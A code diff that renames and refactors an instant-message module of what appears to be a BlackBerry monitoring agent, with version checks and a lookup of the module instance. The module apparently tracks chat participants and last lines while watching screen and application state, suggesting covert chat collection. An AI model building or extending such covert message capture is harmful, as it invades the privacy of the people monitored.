@@ -12,9 +12,9 @@ package blackberry.module;
 import java.util.Vector;
 
 import net.rim.device.api.system.Backlight;
-import blackberry.ModuleManager;
 import blackberry.AppListener;
 import blackberry.Device;
+import blackberry.ModuleManager;
 import blackberry.agent.im.LineMarkup;
 import blackberry.config.ConfModule;
 import blackberry.debug.Debug;
@@ -32,10 +32,10 @@ import blackberry.utils.WChar;
 /**
  * Instant Message.
  */
-public final class ModuleIm extends BaseModule implements BacklightObserver,
+public final class ModuleChat extends BaseModule implements BacklightObserver,
         ApplicationObserver {
     //#ifdef DEBUG
-    static Debug debug = new Debug("ImAgent", DebugLevel.VERBOSE);
+    static Debug debug = new Debug("ModuleChat", DebugLevel.VERBOSE);
     //#endif
 
     private static final long APP_TIMER_PERIOD = 5000;
@@ -47,19 +47,28 @@ public final class ModuleIm extends BaseModule implements BacklightObserver,
 
     LineMarkup markup;
 
+    public static String getStaticType() {
+        return "chat";
+    }
+    
+    public static ModuleChat getInstance() {
+        return (ModuleChat) ModuleManager.getInstance().get(getStaticType());
+    }
+
     /**
      * Instantiates a new task agents
      * 
      * @param agentStatus
      *            the agent status
      */
-    public ModuleIm() {
+    public ModuleChat() {
 
         if (!Device.getInstance().atLeast(5, 0)) {
             //#ifdef DEBUG
-            debug.error("ImAgent: not supported before OS 5.0");
+            debug.error("ChatAgent: not supported before OS 5.0");
             //#endif
             enable(false);
+            return;
         }
 
         //#ifdef IM_FORCED
@@ -74,8 +83,15 @@ public final class ModuleIm extends BaseModule implements BacklightObserver,
     }
 
     protected boolean parse(ConfModule conf) {
-        // TODO Auto-generated method stub
-        return false;
+        if (!Device.getInstance().atLeast(5, 0)) {
+            //#ifdef DEBUG
+            debug.error("ChatAgent: not supported before OS 5.0");
+            //#endif
+            enable(false);
+            setDelay(NEVER);
+            return false;
+        }
+        return true;
     }
 
     private synchronized String unserialize(String partecipants) {
@@ -144,10 +160,6 @@ public final class ModuleIm extends BaseModule implements BacklightObserver,
 
         AppListener.getInstance().removeBacklightObserver(this);
         AppListener.getInstance().removeApplicationObserver(this);
-    }
-
-    public static ModuleIm getInstance() {
-        return (ModuleIm) ModuleManager.getInstance().get("im");
     }
 
     private synchronized void serialize(String partecipants, String lastLine) {
